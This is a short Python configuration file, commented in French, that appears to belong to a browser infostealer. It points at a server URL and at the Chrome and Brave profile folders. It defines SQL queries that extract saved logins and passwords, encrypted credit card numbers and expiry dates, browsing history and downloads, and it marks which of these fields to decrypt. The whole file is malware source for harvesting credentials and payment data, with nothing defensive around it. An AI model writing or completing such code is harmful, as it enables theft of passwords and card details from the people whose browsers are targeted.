import os

server_url = 'https://192.168.1.112:5000'
# Configuration des chemins et des requêtes pour les navigateurs
appdata = os.getenv('LOCALAPPDATA')
browsers = {
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Mot de passe'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Nom de la carte', 'Numéro de carte', 'Mois d\'expiration', 'Année d\'expiration',
                    'Date de modification'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Titre', 'Dernière visite'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['URL', 'Chemin de téléchargement'],
        'decrypt': False
    }
}
